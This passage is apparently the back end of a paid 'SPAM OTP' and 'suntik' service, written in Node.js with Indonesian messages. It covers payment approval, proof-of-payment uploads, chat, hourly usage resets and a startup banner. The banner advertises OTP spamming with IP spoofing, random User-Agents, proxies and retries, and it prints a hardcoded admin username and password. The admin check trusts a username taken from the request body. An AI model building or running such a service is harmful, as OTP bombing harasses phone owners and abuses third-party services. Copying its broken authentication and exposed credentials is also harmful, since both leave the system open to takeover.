        const { paymentId, reason, admin } = req.body;
        const adminUser = db.users.find(u => u.username === admin);
        if (!adminUser || !adminUser.isAdmin) {
            return res.json({ success: false, message: 'Unauthorized!' });
        }
        const payment = db.payments.find(p => p.id === paymentId);
        if (!payment) return res.json({ success: false, message: 'Payment tidak ditemukan!' });
        payment.status = 'rejected';
        payment.reason = reason;
        saveDB();
        io.emit('paymentStatus', { status: 'error', message: `Pembayaran dibatalkan: ${reason}` });
        res.json({ success: true });
    } catch (err) {
        res.json({ success: false, message: err.message });
    }
});

// ===== PAYMENT SUBMIT =====
const storage = multer.diskStorage({
    destination: (req, file, cb) => cb(null, UPLOAD_DIR),
    filename: (req, file, cb) => cb(null, `${Date.now()}-${file.originalname}`)
});
const upload = multer({ storage });

app.post('/api/payments/submit', upload.single('proof'), (req, res) => {
    try {
        const { username, package: pkg, name, paymentMethod } = req.body;
        const user = db.users.find(u => u.username === username);
        if (!user) return res.json({ success: false, message: 'User tidak ditemukan!' });
        if (!req.file) return res.json({ success: false, message: 'Upload bukti pembayaran!' });
        if (!db.payments) db.payments = [];
        db.payments.push({
            id: uuidv4(),
            username,
            package: pkg,
            amount: pkg === 'Premium' ? 10000 : pkg === 'VIP' ? 20000 : 30000,
            name,
            paymentMethod,
            proof: req.file.filename,
            status: 'pending',
            createdAt: new Date().toISOString()
        });
        saveDB();
        io.emit('paymentSubmitted', { username, package: pkg });
        res.json({ success: true, message: 'Pembayaran terkirim!' });
    } catch (err) {
        res.json({ success: false, message: err.message });
    }
});

// ============================================
// SOCKET.IO
// ============================================
const onlineUsers = new Set();

io.on('connection', (socket) => {
    console.log('⚡ User connected:', socket.id);

    socket.on('userOnline', (username) => {
        onlineUsers.add(username);
        const user = db.users.find(u => u.username === username);
        if (user) user.online = true;
        saveDB();
        io.emit('usersOnline', Array.from(onlineUsers));
        io.emit('userStatusChanged', { username, online: true });
    });

    socket.on('sendMessage', (data) => {
        if (!db.messages) db.messages = [];
        db.messages.push(data);
        if (db.messages.length > 1000) db.messages.shift();
        saveDB();
        io.emit('newMessage', data);
    });

    socket.on('disconnect', () => {
        console.log('⚡ User disconnected:', socket.id);
    });
});

// ===== RESET LIMIT SETIAP 1 JAM =====
setInterval(() => {
    const now = Date.now();
    db.users.forEach(user => {
        if (user.limit !== Infinity && user.limit !== '∞') {
            if (user.lastReset && (now - user.lastReset) >= 3600000) {
                user.used = 0;
                user.lastReset = now;
                console.log(`🔄 Reset limit untuk ${user.username}`);
            }
            if (!user.lastReset) {
                user.lastReset = now;
                user.used = 0;
            }
        }
    });
    saveDB();
    io.emit('usersUpdated', {});
}, 60000);

// ============================================
// START SERVER
// ============================================
const PORT = process.env.PORT || 3000;
server.listen(PORT, async () => {
    console.log(`🚀 Server running on port ${PORT}`);
    console.log('========================================');
    console.log('👑 Admin: Lynzka / Asiafone11');
    console.log('📱 SPAM OTP & SUNTIK AGGRESSIVE MODE');
    console.log('========================================');
    console.log(`🔥 ${otpServices.length} API OTP Services`);
    console.log(`🔥 ${freeSuntikServices.length} Suntik Services`);
    console.log('========================================');
    console.log('📊 Limit per status:');
    console.log('   Free     : 15x');
    console.log('   Premium  : 80x');
    console.log('   VIP      : 150x');
    console.log('   Reseller : 200x');
    console.log('   Developer: Unlimited');
    console.log('========================================');
    console.log('🛡️ AGGRESSIVE MODE:');
    console.log('   ✅ Random User-Agent');
    console.log('   ✅ Random IP Spoofing');
    console.log('   ✅ Proxy Support');
    console.log('   ✅ Retry Mechanism');
    console.log('   ✅ Random Delay');
    console.log('========================================');
    console.log('✅ All done!');
    console.log('========================================');
});